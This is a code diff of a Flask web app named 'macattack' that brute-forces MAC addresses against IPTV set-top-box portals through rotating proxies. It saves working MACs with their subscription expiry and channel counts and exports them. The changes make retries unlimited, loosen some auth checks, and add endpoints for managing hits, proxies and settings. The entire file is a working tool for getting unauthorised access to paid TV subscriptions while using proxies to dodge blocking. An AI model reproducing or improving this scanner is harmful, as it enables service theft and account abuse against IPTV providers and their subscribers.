@@ -1,31 +1,27 @@
-import os, json, logging, threading, asyncio, hashlib, time, secrets
+import os, json, logging, threading, asyncio, hashlib, secrets, time
 from datetime import datetime
-from flask import Flask, render_template, request, jsonify, session, redirect, url_for
-from collections import deque
 from functools import wraps
+from collections import deque
+from flask import Flask, render_template, request, jsonify, Response, session
 import stb_async
 
-# --- CONFIG & LOGGING ---
+# --- CONFIG ---
 CONFIG_FILE = os.getenv("CONFIG", "./data/macattack.json")
 os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
-
 app = Flask(__name__)
 app.secret_key = secrets.token_urlsafe(32)
 
-SCAN_STATE = {
-    "running": False, "total": 0, "checked": 0, "hits": 0, "errors": 0,
-    "active_proxies": 0, "queue_size": 0, "start_time": None
-}
+SCAN_STATE = {"running": False, "total": 0, "checked": 0, "hits": 0, "errors": 0, "active_proxies": 0}
 
 def load_config():
     if os.path.exists(CONFIG_FILE):
         with open(CONFIG_FILE, 'r') as f: return json.load(f)
-    return {"portals": [], "proxies": [], "found_macs": [], "settings": {}}
+    return {"portals": [], "proxies": [], "found_macs": [], "settings": {"auth_enabled": False, "unlimited_retries": True}}
 
-def save_config(config_data):
-    with open(CONFIG_FILE, 'w') as f: json.dump(config_data, f, indent=4)
+def save_config(conf):
+    with open(CONFIG_FILE, 'w') as f: json.dump(conf, f, indent=4)
 
-# --- AUTH DECORATOR ---
+# --- AUTH ---
 def requires_auth(f):
     @wraps(f)
     def decorated(*args, **kwargs):
@@ -37,62 +33,52 @@ def requires_auth(f):
 
 # --- SCANNER CORE ---
 class AsyncScanner:
-    def __init__(self, macs, portal, proxies, threads, skip_unlimited):
+    def __init__(self, macs, portal, proxies, threads, skip_unl, unl_retries):
         self.macs = macs
         self.portal = portal
         self.proxies = deque([{'url': p, 'score': 10} for p in proxies])
         self.threads = threads
-        self.skip_unlimited = skip_unlimited
+        self.skip_unl = skip_unl
+        self.unl_retries = unl_retries
         self.queue = asyncio.Queue()
         self.retry_counts = {}
         self.client = stb_async.AsyncStbClient()
-        self.running = True
 
     async def worker(self):
-        while self.running and SCAN_STATE['running']:
-            try:
-                item = await asyncio.wait_for(self.queue.get(), timeout=1.0)
+        while SCAN_STATE['running']:
+            try: item = await asyncio.wait_for(self.queue.get(), timeout=1.0)
             except: continue
 
             if not self.proxies: break
-            
             p_obj = self.proxies.popleft()
+            
             try:
                 success, data = await self.client.quick_scan(self.portal, item['mac'], p_obj['url'])
                 SCAN_STATE['checked'] += 1
-                
                 if success:
                     p_obj['score'] = min(p_obj['score'] + 1, 20)
                     self.proxies.append(p_obj)
-                    
-                    is_unl = 'unlimited' in str(data['expiry']).lower()
-                    if not (is_unl and self.skip_unlimited):
+                    if not ('unlimited' in str(data['expiry']).lower() and self.skip_unl):
                         data = await self.client.fetch_details(data, p_obj['url'])
                     
                     data['found_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                     SCAN_STATE['hits'] += 1
-                    
-                    # Persistent Save
-                    conf = load_config()
-                    conf['found_macs'].append(data)
-                    save_config(conf)
+                    conf = load_config(); conf['found_macs'].append(data); save_config(conf)
                 else:
                     self.proxies.append(p_obj)
-            except (stb_async.ProxyError):
+            except:
                 p_obj['score'] -= 1
                 if p_obj['score'] > 0: self.proxies.append(p_obj)
                 
-                # RE-QUEUE LOGIK (Der Kern deiner Anfrage)
+                # UNLIMIT RETRY: MAC zurück in die Queue
                 retries = self.retry_counts.get(item['mac'], 0)
-                if retries < 100:
+                if self.unl_retries or retries < 10:
                     self.retry_counts[item['mac']] = retries + 1
                     await self.queue.put(item)
-                else:
-                    SCAN_STATE['errors'] += 1
+                else: SCAN_STATE['errors'] += 1
             finally:
                 self.queue.task_done()
                 SCAN_STATE['active_proxies'] = len(self.proxies)
-                SCAN_STATE['queue_size'] = self.queue.qsize()
 
     async def run(self):
         for m in self.macs: await self.queue.put({'mac': m})
@@ -101,43 +87,76 @@ class AsyncScanner:
         await self.client.close()
         SCAN_STATE['running'] = False
 
-def start_scan_thread(macs, portal, proxies, threads, skip_unl):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    scanner = AsyncScanner(macs, portal, proxies, threads, skip_unl)
-    loop.run_until_complete(scanner.run())
-
 # --- ROUTES ---
 @app.route('/')
-def index():
-    conf = load_config()
-    if conf.get("settings", {}).get("auth_enabled") and not session.get("logged_in"):
-        return render_template('setup.html') # Oder Login
-    return render_template('index.html', version="3.1-Async")
+def index(): return render_template('index.html', version="3.1-Async")
 
 @app.route('/api/attack/start', methods=['POST'])
 @requires_auth
 def api_start():
-    if SCAN_STATE['running']: return jsonify({"error": "Scan already running"})
     data = request.json
+    conf = load_config()
     SCAN_STATE.update({"running": True, "total": len(data['macs']), "checked": 0, "hits": 0, "errors": 0})
     
-    t = threading.Thread(target=start_scan_thread, args=(
-        data['macs'], data['portal'], data['proxies'], 
-        int(data.get('threads', 100)), data.get('skip_unlimited', False)
-    ))
-    t.start()
+    def run_loop():
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        scanner = AsyncScanner(data['macs'], data['portal'], data['proxies'], 
+                              int(data.get('threads', 100)), data.get('skip_unlimited', False),
+                              conf['settings'].get('unlimited_retries', True))
+        loop.run_until_complete(scanner.run())
+    
+    threading.Thread(target=run_loop, daemon=True).start()
     return jsonify({"success": True})
 
 @app.route('/api/attack/status')
-def api_status():
-    return jsonify(SCAN_STATE)
+def api_status(): return jsonify(SCAN_STATE)
 
 @app.route('/api/attack/stop', methods=['POST'])
-@requires_auth
 def api_stop():
     SCAN_STATE['running'] = False
     return jsonify({"success": True})
 
+@app.route('/api/found', methods=['GET', 'DELETE'])
+@requires_auth
+def api_found():
+    conf = load_config()
+    if request.method == 'DELETE':
+        conf['found_macs'] = []
+        save_config(conf)
+        return jsonify({"success": True})
+    return jsonify(conf.get('found_macs', []))
+
+@app.route('/api/found/export')
+@requires_auth
+def api_export():
+    fmt = request.args.get("format", "txt")
+    found = load_config().get("found_macs", [])
+    if fmt == "json":
+        return Response(json.dumps(found, indent=2), mimetype="application/json")
+    
+    lines = [f"Portal: {m['portal']} | MAC: {m['mac']} | Expiry: {m['expiry']} | Ch: {m.get('channels', 0)}" for m in found]
+    return Response("\n".join(lines), mimetype="text/plain")
+
+@app.route('/api/settings', methods=['GET', 'POST'])
+@requires_auth
+def api_settings():
+    conf = load_config()
+    if request.method == 'POST':
+        conf['settings'].update(request.json); save_config(conf)
+        return jsonify({"success": True})
+    return jsonify(conf.get('settings', {}))
+
+@app.route('/api/proxies', methods=['GET', 'POST', 'DELETE'])
+@requires_auth
+def api_proxies():
+    conf = load_config()
+    if request.method == 'POST':
+        new_p = request.json.get('proxies', [])
+        conf['proxies'] = list(set(conf.get('proxies', []) + new_p)); save_config(conf)
+    elif request.method == 'DELETE':
+        conf['proxies'] = []; save_config(conf)
+    return jsonify(conf.get('proxies', []))
+
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080)
+    app.run(host="0.0.0.0", port=5003)
